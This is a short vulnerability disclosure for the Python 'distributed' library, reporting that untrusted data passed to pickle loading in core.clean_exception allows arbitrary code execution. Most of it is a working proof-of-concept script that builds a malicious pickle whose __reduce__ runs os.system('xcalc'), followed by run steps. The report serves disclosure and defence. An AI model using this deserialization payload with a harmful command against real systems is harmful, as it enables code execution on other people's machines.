# Description
 distributed is a library for distributed computation.
* **Vulnerability description**
    untrusted loading of data by the pickle.load function leading to Arbitrary code execution.

# Proof of Concept
Run exploit.py
```
import os
import pickle
#os.system('pip3 install distributed')
from distributed import core
#payload formation
class ArbitraryCode:
    def __reduce__(self):
        cmd = ('xcalc')
        return os.system, (cmd,)
#exploiting
dumps = pickle.dumps(ArbitraryCode())
core.clean_exception(dumps,dumps)
```
* `pip3 install distributed`
* `python3 exploit.py`
